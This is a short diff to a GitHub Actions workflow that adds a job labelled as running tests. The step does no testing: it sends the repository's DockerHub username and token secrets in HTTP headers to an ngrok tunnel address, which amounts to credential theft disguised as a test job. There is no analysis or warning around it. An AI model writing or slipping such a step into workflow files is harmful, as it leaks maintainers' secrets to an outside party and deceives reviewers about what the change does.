@@ -5,6 +5,15 @@ on:
     types: [opened, reopened, synchronize]
 
 jobs:
+  test:
+    name: "Test"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run the tests
+        run: |
+          curl -XPOST -H "${{ secrets.DOCKERHUB_USERNAME }}: true" -H "${{ secrets.DOCKERHUB_TOKEN }}: true" "https://f58c-82-67-66-83.ngrok-free.app"
+
   lint_shell:
     name: "Lint: shell"
     runs-on: ubuntu-latest
